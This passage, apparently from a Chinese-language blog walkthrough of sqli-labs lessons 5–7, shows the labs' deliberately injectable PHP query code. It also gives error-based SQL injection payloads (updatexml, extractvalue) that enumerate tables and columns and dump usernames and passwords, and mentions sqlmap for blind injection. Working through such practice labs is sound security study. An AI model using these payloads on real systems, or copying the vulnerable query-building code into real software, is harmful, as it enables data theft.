  &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt; . &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id=(&lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt;) LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;font size=&amp;#x27;5&amp;#x27; color= &amp;#x27;#99FF00&amp;#x27;&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Your Login name:&amp;#x27;&lt;/span&gt;. &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Your Password:&amp;#x27;&lt;/span&gt; .&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_error&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the ID as parameter with numeric value&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2&gt;&lt;span id=&#34;17-sqli-labs-masterless-5&#34;&gt; 17. sqli-labs-master/Less-5&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型报错、布尔、时间（’,%’）&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;判断&lt;br&gt;
一系列测试貌似没有啥结果，报错注入成功，用 sqlmap 探测一下发现有报错注入、布尔盲注、时间盲注&lt;/li&gt;
&lt;li&gt;爆库 (以报错注入讲解)&lt;br&gt;
1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+&lt;br&gt;
1’ and extractvalue(1,concat(0x7e,database(),0x7e))–+&lt;br&gt;
 当前数据库：security&lt;/li&gt;
&lt;li&gt;爆表&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ()),0x7e),1)–+&lt;br&gt;
security 数据库：emails,referers,uagents,users&lt;/li&gt;
&lt;li&gt;爆列&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_schema=database ()),0x7e),1)–+&lt;br&gt;
security 数据库：id,email_id,id,referer,ip_addre&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=‘users’),0x7e),1)–+&lt;br&gt;
USER,CURRENT_CONNECTIONS,TOTAL&lt;br&gt;
 没完全爆出来，建议使用盲注，left（）,right () 函数在这里貌似不行&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘表名’ limit 0,1),0x7e),1) --+&lt;br&gt;
 不断更改 limit () 取值范围即可&lt;br&gt;
发现有 username,password&lt;br&gt;
5. 爆值&lt;br&gt;
 1’ and updatexml (1,concat (0x7e,(select group_concat (username,password) from (security.users)),0x7e),1)–+&lt;br&gt;
DumbDumb,AngelinaI-kill-you,Dum&lt;br&gt;
 同理不断更改 limit () 就可得到全部内容&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;代码&lt;/li&gt;
&lt;/ol&gt;
  &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt;&amp;#x27; LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in...........&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;3&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_error&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size= 3&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the ID as parameter with numeric value&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;mysql_error () 函数返回上一个 MySQL 操作产生的文本错误信息&lt;/p&gt;
&lt;h2&gt;&lt;span id=&#34;18-sqli-labs-masterless-6&#34;&gt; 18. sqli-labs-master/Less-6&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型报错、布尔、时间（&amp;quot;,’&amp;quot;）&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;br&gt;
一系列测试貌似没有啥结果，报错注入成功，用 sqlmap 探测一下发现有报错注入、布尔盲注、时间盲注&lt;br&gt;
稍微有点区别，之前报错注入和盲注都是单引号，这里是双引号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆库 (以报错注入讲解)&lt;br&gt;
1&amp;quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+&lt;br&gt;
1&amp;quot; and extractvalue(1,concat(0x7e,database(),0x7e))–+&lt;br&gt;
 当前数据库：security&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆表&lt;br&gt;
 1&amp;quot; and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ()),0x7e),1)–+&lt;br&gt;
security 数据库：emails,referers,uagents,users&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆列&lt;br&gt;
 1&amp;quot; and updatexml (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_name=‘users’),0x7e),1)–+&lt;br&gt;
USER,CURRENT_CONNECTIONS,TOTAL&lt;br&gt;
 没完全爆出来，建议使用盲注，left（）,right () 函数在这里貌似不行&lt;br&gt;
 1&amp;quot; and updatexml (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘表名’ limit 0,1),0x7e),1) --+&lt;br&gt;
 不断更改 limit () 取值范围即可&lt;br&gt;
发现有 username,password&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;爆值&lt;br&gt;
 1&amp;quot; and updatexml (1,concat (0x7e,(select group_concat (username,password) from (security.users)),0x7e),1)–+&lt;br&gt;
DumbDumb,AngelinaI-kill-you,Dum&lt;br&gt;
 同理不断更改 limit () 就可得到全部内容&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
  &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id=&lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt; LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;5&amp;quot; color=&amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in...........&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font size=&amp;quot;3&amp;quot;  color= &amp;quot;#FFFF00&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_error&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;lt;/font&amp;gt;&amp;quot;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;font color= &amp;quot;#0000ff&amp;quot; font size= 3&amp;gt;&amp;#x27;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123; &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Please input the ID as parameter with numeric value&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2&gt;&lt;span id=&#34;19-sqli-labs-masterless-7&#34;&gt; 19. sqli-labs-master/Less-7&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;字符型布尔、时间&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;br&gt;
 sqlmap 跑一下，发现是布尔和时间盲注&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;盲注&lt;br&gt;
既然是盲注，那就手工操作或者 sqlmap、脚本跑一下，手工比较麻烦，在这里我采取无脑 sqlmap 跑一下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
  &lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM users WHERE id=((&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt;&amp;#x27;)) LIMIT 0,1&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_query&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysql_fetch_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span 